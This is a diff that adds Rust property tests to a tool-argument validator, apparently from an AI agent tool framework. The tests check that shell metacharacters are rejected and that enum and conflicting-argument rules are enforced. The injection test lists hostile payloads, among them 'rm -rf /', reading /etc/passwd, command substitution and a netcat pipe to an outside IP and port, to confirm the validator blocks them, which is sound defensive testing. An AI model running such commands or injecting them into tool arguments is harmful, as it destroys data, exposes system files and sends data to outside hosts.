@@ -812,4 +812,83 @@ mod tests {
 
         _ = std::fs::remove_dir_all(&temp);
     }
+
+    mod prop_tests {
+        use proptest::prelude::*;
+
+        use super::*;
+
+        proptest! {
+            #[test]
+            fn prop_shell_injection_payloads_rejected_by_regex(
+                prefix in "[a-zA-Z0-9_-]{1,10}",
+                meta in prop_oneof![
+                    Just("; rm -rf /"),
+                    Just("&& id"),
+                    Just("|| cat /etc/passwd"),
+                    Just("$(whoami)"),
+                    Just("`uname`"),
+                    Just("| nc 1.2.3.4 4444"),
+                    Just("\necho pwn"),
+                    Just(" > /tmp/x"),
+                ],
+                suffix in "[a-zA-Z0-9_]{0,6}",
+            ) {
+                let ws = Path::new(".");
+                let tool = ToolDefinition {
+                    name: "guarded_cmd".to_owned(),
+                    command: echo_cmd(),
+                    args: vec![ToolArg {
+                        name: "target".to_owned(),
+                        required: true,
+                        regex: Some("^[a-zA-Z0-9_-]+$".to_owned()),
+                        ..Default::default()
+                    }],
+                    ..Default::default()
+                };
+
+                let clean = json!({ "target": prefix });
+                prop_assert!(validate_and_build_args(&tool, ws, &clean).is_ok());
+
+                let injected = format!("{prefix}{meta}{suffix}");
+                let bad = json!({ "target": injected });
+                prop_assert!(validate_and_build_args(&tool, ws, &bad).is_err());
+            }
+
+            #[test]
+            fn prop_mutually_exclusive_and_enum_validation_enforced(
+                a_val in "[a-z]{2,8}",
+                b_val in "[a-z]{2,8}",
+                bad_mode in "[a-z]{4,10}",
+            ) {
+                let ws = Path::new(".");
+                let tool = ToolDefinition {
+                    name: "conflict_cmd".to_owned(),
+                    command: echo_cmd(),
+                    args: vec![
+                        ToolArg {
+                            name: "mode".to_owned(),
+                            enum_values: vec!["fast".to_owned(), "safe".to_owned()],
+                            conflicts_with: vec!["override_flag".to_owned()],
+                            ..Default::default()
+                        },
+                        ToolArg {
+                            name: "override_flag".to_owned(),
+                            ..Default::default()
+                        },
+                    ],
+                    ..Default::default()
+                };
+
+                let conflict = json!({ "mode": "fast", "override_flag": b_val });
+                prop_assert!(validate_and_build_args(&tool, ws, &conflict).is_err());
+
+                if bad_mode != "fast" && bad_mode != "safe" {
+                    let invalid_enum = json!({ "mode": bad_mode });
+                    prop_assert!(validate_and_build_args(&tool, ws, &invalid_enum).is_err());
+                }
+                let _ = a_val;
+            }
+        }
+    }
 }
